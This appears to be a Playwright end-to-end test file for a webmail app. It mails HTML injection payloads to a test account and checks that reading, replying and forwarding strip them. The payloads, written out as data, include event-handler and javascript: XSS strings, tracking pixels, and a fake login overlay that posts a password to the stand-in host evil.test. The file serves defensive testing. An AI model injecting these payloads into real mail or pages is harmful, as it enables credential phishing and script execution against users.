// Browser tests for injection attacks via email content. Needs the running stack and Playwright with Chromium.
//   BASE_URL=http://localhost:3000 npm run test:e2e
import { test } from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import { createRequire } from 'node:module';
const D = process.env.TEST_DOMAIN || 'free.test'; // the sign-up domain of the server under test

const require = createRequire(import.meta.url);
const { chromium } = require('playwright');
const BASE = process.env.BASE_URL || 'http://localhost:3000';
const PW = 'Tq9-vLm2-Zx81';
const user = `x${crypto.randomBytes(3).toString('hex')}`;
const hdr = { 'X-Requested-With': 'mailcow-client', 'X-Forwarded-For': `198.19.${crypto.randomInt(0, 255)}.${crypto.randomInt(1, 254)}` };

async function api(path, body, cookie, form) {
  const headers = { ...hdr, ...(cookie ? { Cookie: cookie } : {}), ...(form ? {} : { 'Content-Type': 'application/json' }) };
  const r = await fetch(BASE + path, { method: 'POST', headers, body: form || JSON.stringify(body) });
  return { r, cookie: (r.headers.getSetCookie?.() || []).find((c) => c.startsWith('mc_session='))?.split(';')[0] };
}

const PAYLOADS = {
  'event handler': '<p>Report</p><img src="x" onerror="window.__pwned=1">',
  'fake login overlay': '<style>.app{display:none}</style><div style="position:fixed;inset:0;z-index:9999;background:#fff">Session expired<form action="https://evil.test"><input name="pw" type="password"><button>Sign in</button></form></div>',
  'javascript link': '<a href="javascript:window.__pwned=1">click</a><svg onload="window.__pwned=1"></svg>',
  'tracking pixel via CSS': '<style>body{background:image-set("https://tracker.test/p.png" 1x)}</style><div style="background:url(https://tracker.test/q.png)">x</div><img src="https://tracker.test/r.png" width=1 height=1>',
};

test('malicious email content cannot run code or overlay the app (reading, reply, forward)', async () => {
  const { cookie } = await api('/api/signup', { name: 'E2E', username: user, password: PW, acceptTerms: true });
  assert.ok(cookie, 'signed up');
  // first sign-in setup: postpone 2-step verification and finish the welcome wizard (tested in setup.test.js)
  await api('/api/setup/2fa/remind', {}, cookie); await api('/api/setup/step', { step: 'done' }, cookie);
  await new Promise((r) => setTimeout(r, 1500));
  for (const [subject, html] of Object.entries(PAYLOADS)) {
    const fd = new FormData(); fd.append('to', `${user}@${D}`); fd.append('subject', subject); fd.append('html', html);
    await api('/api/send', null, cookie, fd);
  }
  await new Promise((r) => setTimeout(r, 1500));

  const browser = await chromium.launch();
  try {
    const page = await browser.newPage();
    const remote = [];
    page.on('request', (r) => { if (/tracker\.test|evil\.test/.test(r.url())) remote.push(r.url()); });
    await page.goto(`${BASE}/login`);
    // Gmail-style sign-in: email, Next, password, Next
    await page.fill('input[autocomplete=username]', `${user}@${D}`);
    await page.click('.g-btn');
    await page.fill('input[autocomplete=current-password]', PW);
    await page.click('.g-btn');
    await page.waitForURL(/\/\d{8}\/inbox$/); // lands on roammail.net/{mailboxId}/inbox
    await page.waitForSelector('.row');
    for (const subject of Object.keys(PAYLOADS)) {
      await page.click(`.row:has-text("${subject}")`);
      await page.waitForSelector('.tmsg-body iframe');
      await page.waitForTimeout(400);
      for (const key of ['r', 'f']) {
        await page.keyboard.press(key);
        await page.waitForSelector('.composer .editor');
        await page.waitForTimeout(1200);
        const ed = page.locator('.composer .editor').last();
        const found = await ed.evaluate((el) => ({
          handlers: el.querySelectorAll('[onerror],[onload],[onclick]').length,
          styles: el.querySelectorAll('style').length,
          forms: el.querySelectorAll('form,input,button,svg').length,
          jsLinks: [...el.querySelectorAll('a')].filter((a) => /^javascript:/i.test(a.getAttribute('href') || '')).length,
          fixed: [...el.querySelectorAll('*')].filter((x) => getComputedStyle(x).position === 'fixed').length,
        }));
        assert.deepEqual(found, { handlers: 0, styles: 0, forms: 0, jsLinks: 0, fixed: 0 }, `${subject} (${key})`);
        await page.locator('.composer-bar button[title="Save & close"]').last().click();
        await page.waitForTimeout(300);
      }
      assert.equal(await page.evaluate(() => window.__pwned ?? null), null, subject);
      assert.ok(await page.evaluate(() => getComputedStyle(document.querySelector('.app')).display !== 'none'), `${subject}: app still visible`);
    }
    assert.deepEqual(remote, [], 'no remote content loaded while images are blocked');
  } finally {
    await browser.close();
  }
});
